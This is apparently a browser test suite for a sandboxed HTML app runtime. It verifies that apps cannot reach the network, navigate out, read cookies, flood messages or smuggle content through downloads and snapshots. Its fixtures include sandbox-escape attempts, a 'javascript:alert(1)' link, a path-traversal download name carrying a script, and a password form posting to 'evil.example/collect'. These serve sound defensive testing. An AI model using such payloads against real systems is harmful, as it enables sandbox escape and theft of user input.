// HTML app mounts in real engines (Chromium and WebKit through the repository launcher):
// sandbox, network, navigation, modules and `ready`, hash, theme, downloads, links,
// confirmations, budgets, charts and snapshots. The host page is the real composer,
// prelude and host with in-memory services.
import { afterAll, beforeAll, expect, test } from "bun:test";
import type { Browser, Page } from "playwright";
import { launchBrowser } from "../../../../ui/test/browser";
import { ChunkName, chunkSource } from "../runtime/chunks";
import { buildBaseCss, buildPrelude } from "./build-assets";
import type { AppFiles } from "./compose";

const sinkHits: string[] = [];
let sink: ReturnType<typeof Bun.serve>;
/** Counts bare TCP connections: a preconnect hint opens one without sending a request. */
let connections = 0;
let listener: { port: number; stop(closeActive?: boolean): void };
let server: ReturnType<typeof Bun.serve>;
let browser: Browser;
const SINK = () => `http://127.0.0.1:${sink.port}`;

beforeAll(async () => {
  sink = Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    fetch(request) {
      sinkHits.push(new URL(request.url).pathname);
      return new Response("<h1>sink</h1>", { headers: { "content-type": "text/html" } });
    },
  });
  listener = Bun.listen({
    hostname: "127.0.0.1",
    port: 0,
    socket: {
      open: () => {
        connections++;
      },
      data: () => {},
    },
  });
  const [prelude, baseCss, harness] = await Promise.all([
    buildPrelude(),
    buildBaseCss(),
    Bun.build({
      entrypoints: [new URL("./html-app-browser-harness.ts", import.meta.url).pathname],
      target: "browser",
      format: "iife",
    }).then(async (build) => {
      if (!build.success) throw new AggregateError(build.logs, "harness build failed");
      return build.outputs[0]!.text();
    }),
  ]);
  const preludeHash = `'sha256-${new Bun.CryptoHasher("sha256").update(prelude).digest("base64")}'`;
  const assets = `globalThis.assets=${JSON.stringify({ prelude, preludeHash, baseCss })};`;
  server = Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    async fetch(request) {
      const path = new URL(request.url).pathname;
      if (path === "/assets.js") return new Response(assets, { headers: { "content-type": "text/javascript" } });
      if (path === "/harness.js") return new Response(harness, { headers: { "content-type": "text/javascript" } });
      const chunk = /^\/chunks\/([\w-]+)$/.exec(path);
      if (chunk) return new Response(await chunkSource(ChunkName.parse(chunk[1])), { headers: { "content-type": "text/javascript" } });
      if (path !== "/") return new Response("not found", { status: 404 });
      return new Response(
        `<!doctype html><html lang="de" class="light"><head><meta charset="utf-8"><title>Host</title>
<style>html,body{margin:0;height:100%}main{display:flex;height:100vh}</style></head>
<body><main></main><script src="/assets.js"></script><script src="/harness.js"></script></body></html>`,
        { headers: { "content-type": "text/html; charset=utf-8" } },
      );
    },
  });
  browser = await launchBrowser();
}, 120_000);
afterAll(async () => {
  await browser?.close();
  server?.stop(true);
  sink?.stop(true);
  listener?.stop(true);
});

async function open(files: AppFiles, options: { hash?: string; answers?: boolean[]; download?: "capture" | "save" } = {}) {
  const context = await browser.newContext({ acceptDownloads: true });
  const page = await context.newPage();
  await page.goto(`http://127.0.0.1:${server.port}/`);
  await page.evaluate(([files, options]) => globalThis.harness.mount(files, options), [files, options] as const);
  return { page, close: () => context.close() };
}
const events = (page: Page) =>
  page.evaluate(() => JSON.parse(JSON.stringify(globalThis.harness.events)) as { type: string; [key: string]: unknown }[]);
const ready = (page: Page) =>
  page.waitForFunction(() => globalThis.harness.events.some((event) => event.type === "ready"), undefined, { timeout: 10_000 });
const app = (page: Page) => page.frameLocator("iframe.studio-app-frame").frameLocator("iframe");
/** Reads until the value matches, like Playwright's expect.poll. */
async function eventually<T>(read: () => Promise<T>, matches: (value: T) => boolean, timeout = 5000): Promise<T> {
  const until = Date.now() + timeout;
  let value = await read();
  while (!matches(value) && Date.now() < until) {
    await new Promise((resolve) => setTimeout(resolve, 50));
    value = await read();
  }
  return value;
}
const text = (page: Page, selector: string) => app(page).locator(selector).textContent();

test("the sandbox hides Cloud, storage, network and WebRTC, and turns browser habits into clear errors", async () => {
  const { page, close } = await open({
    "index.html": `<main><h1>Attacks</h1><img alt="" src="${SINK()}/img"><button onclick="x()">x</button><output id="out"></output></main>`,
    "app.js": `
const results = {};
const note = (key, value) => { results[key] = String(value); };
try { note("cookie", document.cookie); } catch (e) { note("cookie", "throws"); }
try { note("parent", parent.parent.document.title); } catch (e) { note("parent", "throws"); }
note("rtc", typeof RTCPeerConnection);
try { fetch("${SINK()}/fetch"); note("fetch", "allowed"); } catch (e) { note("fetch", e.code + ": " + e.message); }
try { localStorage.setItem("a", "b"); note("storage", "allowed"); } catch (e) { note("storage", e.code); }
try { alert("hi"); } catch (e) { note("alert", e.code); }
const tail = "</SCRIPT><!--<script>";
note("tail", tail.length);
note("uuid", /^[0-9a-f-]{36}$/.test(crypto.randomUUID()));
note("user", cloud.user.name + " " + cloud.locale);
document.querySelector("#out").textContent = JSON.stringify(results);
`,
  });
  try {
    await ready(page);
    const results = JSON.parse((await text(page, "#out")) ?? "{}");
    expect(results.cookie === "" || results.cookie === "throws").toBe(true);
    expect(results.parent).toBe("throws");
    expect(results.rtc).toBe("undefined");
    expect(results.fetch).toContain("unavailable: fetch() does not work in Studio apps");
    expect(results.storage).toBe("unavailable");
    expect(results.alert).toBe("unavailable");
    expect(results.tail).toBe("21");
    expect(results.uuid).toBe("true");
    expect(results.user).toBe("Łukasz Öztürk de-DE");
    await page.waitForTimeout(300);
    expect(sinkHits).not.toContain("/img");
    expect(sinkHits).not.toContain("/fetch");
  } finally {
    await close();
  }
});

test("resource hints never reach the network, however an app inserts them", async () => {
  connections = 0;
  const target = `http://127.0.0.1:${listener.port}/`;
  const { page, close } = await open({
    "index.html": `<main><h1>Hints</h1><link rel="preconnect" href="${target}"><output id=out></output></main>`,
    // WebKit connects the moment a preconnect link enters the document, so each insertion path must drop it before.
    "app.js": `const target = ${JSON.stringify(target)};
const hint = (rel = "preconnect") => Object.assign(document.createElement("link"), { rel, href: target });
const markup = '<link rel="preconnect" href="' + target + '">';
const box = () => document.body.appendChild(document.createElement("div"));
const results = {};
const attempt = (name, run) => { try { run(); results[name] = "ok"; } catch (error) { results[name] = error.code ?? error.name; } };
attempt("append", () => document.head.append(hint()));
attempt("appendChild", () => document.head.appendChild(hint("dns-prefetch")));
attempt("replaceWith", () => box().replaceWith(hint()));
attempt("innerHTML", () => (box().innerHTML = "<p>kept</p>" + markup));
attempt("outerHTML", () => (box().outerHTML = markup));
attempt("insertAdjacentHTML", () => document.body.insertAdjacentHTML("beforeend", markup));
attempt("template", () => { const template = document.createElement("template"); template.innerHTML = markup; document.body.append(template.content.cloneNode(true)); });
attempt("parser", () => document.head.append(document.adoptNode(new DOMParser().parseFromString(markup, "text/html").querySelector("link"))));
attempt("shadow", () => (box().attachShadow({ mode: "closed" }).innerHTML = markup));
attempt("range", () => { const range = document.createRange(); range.selectNodeContents(document.body); range.insertNode(range.createContextualFragment(markup)); });
attempt("relLater", () => { const link = document.createElement("link"); document.head.append(link); link.href = target; link.rel = "preconnect"; });
attempt("write", () => document.write(markup));
attempt("restore", () => Object.defineProperty(Node.prototype, "appendChild", { value: () => null }));
results.links = document.querySelectorAll("link").length;
results.kept = document.querySelectorAll("p").length;
document.querySelector("#out").textContent = JSON.stringify(results);`,
  });
  try {
    await ready(page);
    const results = JSON.parse((await text(page, "#out")) ?? "{}");
    expect(results).toEqual({
      append: "ok",
      appendChild: "ok",
      replaceWith: "ok",
      innerHTML: "ok",
      outerHTML: "ok",
      insertAdjacentHTML: "ok",
      template: "ok",
      parser: "ok",
      shadow: "ok",
      range: "ok",
      relLater: "ok",
      write: "unavailable",
      restore: "TypeError",
      links: 0,
      kept: 1,
    });
    // Connections open asynchronously; give a late one time to arrive.
    await page.waitForTimeout(1000);
    expect(connections).toBe(0);
    const warnings = (await events(page)).filter(
      (event) => event.type === "log" && String(event.text).startsWith("Cloud removed a <link>"),
    );
    expect(warnings).toHaveLength(1);
  } finally {
    await close();
  }
});

test("an app cannot navigate itself, the Cloud page or a popup; links and open() only ask Cloud", async () => {
  sinkHits.length = 0;
  const { page, close } = await open({
    "index.html": "<main><h1>Escape</h1></main>",
    "app.js": `setTimeout(() => {
  try { top.location = "${SINK()}/top"; } catch (e) {}
  const a = document.createElement("a"); a.href = "${SINK()}/link"; a.target = "_top"; document.body.append(a); a.click();
  const bad = document.createElement("a"); bad.href = "javascript:alert(1)"; document.body.append(bad); bad.click();
  // One Cloud confirmation at a time: the popup asks after the link was answered.
  setTimeout(() => open("${SINK()}/popup"), 600);
  // Last, because a blocked navigation leaves the frame on an error page.
  setTimeout(() => { location.href = "${SINK()}/nav"; }, 1200);
}, 200);`,
  });
  try {
    await ready(page);
    await page.waitForFunction(() => globalThis.harness.opened.length >= 2, undefined, { timeout: 5000 });
    await page.waitForTimeout(1500);
    expect(sinkHits).toEqual([]);
    expect(page.url()).toBe(`http://127.0.0.1:${server.port}/`);
    expect(await page.evaluate(() => globalThis.harness.opened)).toEqual([`${SINK()}/link`, `${SINK()}/popup`]);
    expect((await events(page)).some((event) => event.type === "log" && String(event.text).includes("javascript:alert(1)"))).toBe(true);
    expect(await page.evaluate(() => document.title)).toBe("Host");
  } finally {
    await close();
  }
});

test("modules load relatively, ready waits for top-level await and pending calls, and the hash follows both ways", async () => {
  const { page, close } = await open(
    {
      "index.html": "<main><h1 id=title>…</h1><p id=late></p></main>",
      "app.js": `import { greet } from "./lib/greet.js";
document.querySelector("#title").textContent = greet(cloud.user.name);
await cloud.kv.set("late", "value");
const saved = await cloud.kv.get("late");
document.querySelector("#late").textContent = "loaded " + saved;
const { twice } = await import("./lib/math.js");
document.querySelector("#late").dataset.twice = twice(21);
document.querySelector("#late").dataset.initialHash = location.hash;
addEventListener("hashchange", () => (document.querySelector("#late").dataset.hash = location.hash));
`,
      "lib/greet.js": `import { exclaim } from "../shared.js";\nexport const greet = (name) => exclaim("Hallo " + name);`,
      "lib/math.js": "export const twice = (n) => n * 2;",
      "shared.js": `export const exclaim = (text) => text + "!";`,
    },
    { hash: "#tab=2" },
  );
  try {
    await ready(page);
    // Content behind await and a slow cloud.kv.get is there when ready arrives.
    expect(await text(page, "#late")).toBe("loaded value");
    expect(await text(page, "#title")).toBe("Hallo Łukasz Öztürk!");
    expect(await app(page).locator("#late").getAttribute("data-twice")).toBe("42");
    expect(await app(page).locator("#late").getAttribute("data-initial-hash")).toBe("#tab=2");
    await page.evaluate(() => globalThis.harness.hashToApp("#tab=3"));
    expect(
      await eventually(
        () => app(page).locator("#late").getAttribute("data-hash"),
        (value) => value === "#tab=3",
      ),
    ).toBe("#tab=3");
    expect(await page.evaluate(() => globalThis.harness.hash)).toBe("#tab=3");
    // Neither the app nor the prelude trips the sandbox (for example a library probing eval).
    const errors = (await events(page)).filter((event) => event.type === "error" || (event.type === "log" && event.level === "error"));
    expect(errors).toEqual([]);
  } finally {
    await close();
  }
});

test("module errors name the app file, and circular or missing imports are reported", async () => {
  const { page, close } = await open({
    "index.html": "<main><h1>Broken</h1></main>",
    "app.js": `import "./a.js";\nimport "./gone.js";`,
    "a.js": `import "./b.js";`,
    "b.js": `import "./a.js";`,
  });
  try {
    await ready(page);
    const errors = (await events(page)).filter((event) => event.type === "error").map((event) => String(event.text));
    expect(errors.join("\n")).toMatch(/Circular import: app\.js → a\.js → b\.js → a\.js|missing app file: gone\.js/);
  } finally {
    await close();
  }
});

test("the theme follows Cloud live", async () => {
  const { page, close } = await open({ "index.html": "<main><h1>Theme</h1></main>" });
  try {
    await ready(page);
    expect(await app(page).locator("html").getAttribute("data-theme")).toBe("light");
    await page.evaluate(() => document.documentElement.classList.replace("light", "dark"));
    expect(
      await eventually(
        () => app(page).locator("html").getAttribute("data-theme"),
        (value) => value === "dark",
      ),
    ).toBe("dark");
  } finally {
    await close();
  }
});

test("downloads are octet-stream files with clean names and never open app content", async () => {
  const { page, close } = await open(
    {
      "index.html": '<main><h1>Downloads</h1><a id=link download="bericht.csv">CSV</a><button id=evil type=button>Evil</button></main>',
      "app.js": `document.querySelector("#link").href = URL.createObjectURL(new Blob(["a;b"], { type: "text/csv" }));
document.querySelector("#evil").addEventListener("click", () => cloud.download("../<evil>.html", "<script>alert(1)</script>"));`,
    },
    { download: "save" },
  );
  try {
    await ready(page);
    const first = page.waitForEvent("download");
    await app(page).locator("#link").click();
    expect((await first).suggestedFilename()).toBe("bericht.csv");
    const second = page.waitForEvent("download");
    await app(page).locator("#evil").click();
    const evil = await second;
    expect(evil.suggestedFilename()).not.toContain("/");
    expect(evil.suggestedFilename()).not.toContain("<");
    expect(page.url()).toBe(`http://127.0.0.1:${server.port}/`);
  } finally {
    await close();
  }
});

test("a Cloud confirmation makes the app inert, allows one at a time, and three refusals stop the app", async () => {
  const { page, close } = await open(
    {
      "index.html": "<main><h1>Asks</h1><button id=ask type=button>Ask</button><output id=out></output></main>",
      "app.js": `const out = document.querySelector("#out");
document.querySelector("#ask").addEventListener("click", async () => {
  const both = await Promise.allSettled([cloud.capabilities.run("grids.rows.list", {}), cloud.capabilities.run("grids.rows.list", {})]);
  out.textContent = both.map((result) => result.status === "fulfilled" ? "ok" : result.reason.code).join(",");
});`,
    },
    { answers: [true, false, false, false] },
  );
  try {
    await ready(page);
    await app(page).locator("#ask").click();
    await page.waitForFunction(() => globalThis.harness.inert(), undefined, { timeout: 5000 });
    expect(
      await eventually(
        () => text(page, "#out"),
        (value) => value === "ok,limit",
      ),
    ).toBe("ok,limit");
    expect(await page.evaluate(() => globalThis.harness.inert())).toBe(false);
    await app(page).locator("#ask").click();
    expect(
      await eventually(
        () => text(page, "#out"),
        (value) => value === "denied,limit",
      ),
    ).toBe("denied,limit");
    await app(page).locator("#ask").click();
    expect(
      await eventually(
        () => text(page, "#out"),
        (value) => value === "denied,limit",
      ),
    ).toBe("denied,limit");
    await app(page).locator("#ask").click();
    const stopped = () => events(page).then((list) => list.find((event) => event.type === "stopped")?.reason);
    expect(await eventually(stopped, (reason) => reason !== undefined)).toBe("refusals");
    expect(await page.locator("iframe.studio-app-frame").count()).toBe(0);
  } finally {
    await close();
  }
});

test("messages from other windows are ignored, and a flood stops the app", async () => {
  const { page, close } = await open({
    "index.html": "<main><h1>Flood</h1><button id=go type=button>Go</button></main>",
    "app.js": `document.querySelector("#go").addEventListener("click", () => {
  for (let i = 0; i < 700; i++) parent.parent.postMessage({ type: "hash", value: "#n" + i }, "*");
});`,
  });
  try {
    await ready(page);
    await page.evaluate(() =>
      window.postMessage(
        { type: "rpc", id: 1, method: "storage", args: [{ scope: "shared", area: "kv", operation: "write", key: "x", value: 1 }] },
        "*",
      ),
    );
    await page.waitForTimeout(200);
    expect(await page.evaluate(() => globalThis.harness.calls)).toEqual([]);
    await app(page).locator("#go").click();
    const stopped = () => events(page).then((list) => list.find((event) => event.type === "stopped")?.reason);
    expect(await eventually(stopped, (reason) => reason !== undefined)).toBe("flood");
  } finally {
    await close();
  }
});

test("shared and cyclic arguments are measured once, so a tiny message cannot freeze the Cloud page", async () => {
  const { page, close } = await open({
    "index.html": "<main><h1>Graphs</h1><output id=out></output></main>",
    "app.js": `const answers = new Map();
addEventListener("message", (event) => {
  if (event.data?.type !== "result" || event.data.id < 900) return;
  answers.set(event.data.id, event.data.code);
  if (answers.size === 3) document.querySelector("#out").textContent = JSON.stringify([...answers].sort(([a], [b]) => a - b).map(([, code]) => code)) + " " + Math.round(performance.now() - started);
});
const dag = (levels) => { let node = []; for (let i = 0; i < levels; i++) node = [node, node]; return node; };
const cycle = {}; cycle.a = cycle; cycle.b = cycle;
const started = performance.now();
// 2^30 paths through 30 shared levels, a cycle, and nesting deeper than the host accepts.
for (const [id, value] of [[900, dag(30)], [901, cycle], [902, dag(40)]])
  parent.parent.postMessage({ type: "rpc", id, method: "storage", args: [value] }, "*");`,
  });
  try {
    await ready(page);
    const [codes, elapsed] = (await eventually(
      () => text(page, "#out"),
      (value) => !!value,
      5000,
    ))!.split(" ");
    // Both graphs fit and then fail the storage input check; only the deep nesting hits the limit.
    expect(JSON.parse(codes!)).toEqual(["invalid", "invalid", "limit"]);
    expect(Number(elapsed)).toBeLessThan(1000);
  } finally {
    await close();
  }
});

test("a reused call id is refused, so at most 32 calls of one app run at once", async () => {
  const { page, close } = await open({
    "index.html": "<main><h1>Ids</h1></main>",
    "app.js": `const read = { scope: "shared", area: "kv", operation: "read", key: "k" };
for (let i = 0; i < 100; i++) parent.parent.postMessage({ type: "rpc", id: 7, method: "storage", args: [read] }, "*");
for (let i = 0; i < 40; i++) parent.parent.postMessage({ type: "rpc", id: 1000 + i, method: "storage", args: [read] }, "*");`,
  });
  try {
    await ready(page);
    await page.waitForTimeout(200);
    const reads = await page.evaluate(() => globalThis.harness.calls.filter((call) => call.startsWith("storage:read")).length);
    expect(reads).toBe(32);
  } finally {
    await close();
  }
});

test("blocked external images are one sandbox finding, and the app keeps running", async () => {
  sinkHits.length = 0;
  const { page, close } = await open({
    "index.html": "<main><h1>People</h1><ul id=list></ul></main>",
    "app.js": `const list = document.querySelector("#list");
for (let i = 0; i < 800; i++) {
  const item = document.createElement("li");
  const image = document.createElement("img");
  image.alt = "";
  image.src = "${SINK()}/avatar/" + i + ".png";
  item.append(image, "Person " + i);
  list.append(item);
}`,
  });
  try {
    await ready(page);
    await page.waitForTimeout(500);
    const all = await events(page);
    expect(all.some((event) => event.type === "stopped")).toBe(false);
    const blocked = all.filter((event) => event.type === "log" && String(event.text).startsWith("Blocked by the app sandbox"));
    expect(blocked.map((event) => event.text)).toEqual([`Blocked by the app sandbox: img-src ${SINK()}`]);
    expect(await app(page).locator("li").count()).toBe(800);
    expect(sinkHits).toEqual([]);
  } finally {
    await close();
  }
});

test("import-like text in comments and strings does not stop an app from loading", async () => {
  const { page, close } = await open({
    "index.html": "<main><output id=out>before</output></main>",
    "app.js": `// import "./old.js" was removed
const label = 'Import from "./data.csv"';
import { done } from "./lib.js";
document.querySelector("#out").textContent = done(label);`,
    "lib.js": `/* export * from "./gone.js" */ export const done = (label) => "ran: " + label;`,
  });
  try {
    await ready(page);
    expect(await text(page, "#out")).toBe('ran: Import from "./data.csv"');
    expect((await events(page)).filter((event) => event.type === "error")).toEqual([]);
  } finally {
    await close();
  }
});

test("notices carry only a known code, never text from the app", async () => {
  const { page, close } = await open({
    "index.html": "<main><h1>Notices</h1></main>",
    "app.js": `parent.parent.postMessage({ type: "notice", code: "denied", text: "Your Cloud session expired. Sign in again at https://login.example" }, "*");
parent.parent.postMessage({ type: "notice", code: "Sign in at https://login.example" }, "*");
cloud.capabilities.run("grids.rows.list", {});`,
  });
  try {
    await ready(page);
    const notices = () => events(page).then((list) => list.filter((event) => event.type === "notice"));
    // The raw notice, then the unhandled refusal of the capability call.
    expect(await eventually(notices, (list) => list.length >= 2)).toEqual([
      { type: "notice", code: "denied" },
      { type: "notice", code: "denied" },
    ]);
  } finally {
    await close();
  }
});

test("downloads follow the per-file budget of scripts, not the argument budget", async () => {
  const { page, close } = await open({
    "index.html": "<main><output id=out></output></main>",
    "app.js": `await cloud.download("large.bin", new Blob([new Uint8Array(40 * 1024 * 1024)]));
const result = await cloud.download("huge.bin", new Blob([new Uint8Array(51 * 1024 * 1024)])).then(() => "saved", (error) => error.code);
document.querySelector("#out").textContent = result;`,
  });
  try {
    await ready(page);
    expect(
      await eventually(
        () => text(page, "#out"),
        (value) => !!value,
      ),
    ).toBe("limit");
    expect(await page.evaluate(() => globalThis.harness.downloads.map((file) => `${file.name} ${file.size}`))).toEqual([
      `large.bin ${40 * 1024 * 1024}`,
    ]);
  } finally {
    await close();
  }
});

test("a link question that outlives its app opens nothing", async () => {
  const { page, close } = await open(
    {
      "index.html": "<main><h1>Links</h1></main>",
      "app.js": `addEventListener("message", (event) => event.data === "link" && open("${SINK()}/" + Math.random()));`,
    },
    { answers: [true, true] },
  );
  try {
    await ready(page);
    await page.evaluate(() => {
      const opened: string[] = [];
      Object.assign(globalThis, { opened });
      window.open = (url?: string | URL) => {
        opened.push(String(url));
        return null;
      };
    });
    const opened = () => page.evaluate(() => (globalThis as unknown as { opened: string[] }).opened.length);
    const ask = () =>
      page.evaluate(() =>
        (document.querySelector("iframe.studio-app-frame") as HTMLIFrameElement).contentWindow![0]!.postMessage("link", "*"),
      );
    await ask();
    expect(await eventually(opened, (count) => count === 1)).toBe(1);
    await ask();
    await page.waitForFunction(() => globalThis.harness.opened.length === 2);
    // Stopped while the person still decides; the answer arrives 200 ms later.
    await page.evaluate(() => globalThis.harness.stop());
    await page.waitForTimeout(400);
    expect(await opened()).toBe(1);
  } finally {
    await close();
  }
});

test("charts redraw at their real width, lazy libraries load through the host, and a snapshot runs nothing", async () => {
  const { page, close } = await open({
    "index.html":
      '<main><h1 onclick="steal()">Report</h1><figure id=chart></figure><p id=rows></p><a id=bad href="javascript:alert(1)">x</a></main>',
    "app.js": `document.querySelector("#chart").innerHTML = cloud.chart({ kind: "bar", title: "Umsatz", data: [{ label: "Jan", value: 1200 }, { label: "Feb", value: 900 }] });
const rows = await cloud.sheet.parseCsv("Name;Betrag\\nMüller;1.234,56");
document.querySelector("#rows").textContent = rows[0].Name + " " + rows[0].Betrag;`,
  });
  try {
    await ready(page);
    expect(await text(page, "#rows")).toBe("Müller 1234.56");
    expect(await page.evaluate(() => globalThis.harness.calls)).toContain("chunk:csv");
    const chart = app(page).locator(".k2b-chart__svg");
    const width = () => chart.evaluate((element: HTMLElement) => element.style.getPropertyValue("--k2b-chart-width"));
    expect(await eventually(width, (value) => value !== "640px")).not.toBe("640px");
    expect(await app(page).locator(".k2b-chart").getAttribute("aria-label")).toBe("Umsatz");
    const snapshot = await page.evaluate(() => globalThis.harness.snapshot());
    expect(snapshot).not.toMatch(/<script/i);
    expect(snapshot).not.toMatch(/onclick/i);
    expect(snapshot).not.toContain("javascript:");
    expect(snapshot).toContain("default-src 'none'");
    expect(snapshot).toContain("Müller 1234.56");
    const lint = (await events(page)).filter((event) => event.type === "error");
    expect(lint).toEqual([]);
  } finally {
    await close();
  }
});

test("a snapshot shows the values a person entered, and its forms send nothing", async () => {
  const { page, close } = await open({
    "index.html": `<main><form action="https://evil.example/collect"><input id=name value="initial"><input id=ok type=checkbox>
<select id=pick><option>a</option><option>b</option></select><textarea id=note>first</textarea><input id=secret type=password></form></main>`,
  });
  try {
    await ready(page);
    await app(page).locator("#name").fill("Changed");
    await app(page).locator("#ok").check();
    await app(page).locator("#pick").selectOption("b");
    await app(page).locator("#note").fill("second");
    await app(page).locator("#secret").fill("hunter2");
    const snapshot = await page.evaluate(() => globalThis.harness.snapshot());
    expect(snapshot).toContain('value="Changed"');
    expect(snapshot).toMatch(/id="ok"[^>]*checked|checked[^>]*id="ok"/);
    expect(snapshot).toMatch(/<option selected="">b<\/option>/);
    expect(snapshot).toContain(">second</textarea>");
    expect(snapshot).not.toContain("hunter2");
    expect(snapshot).not.toContain("evil.example");
    expect(snapshot).toContain("form-action 'none'");
  } finally {
    await close();
  }
});
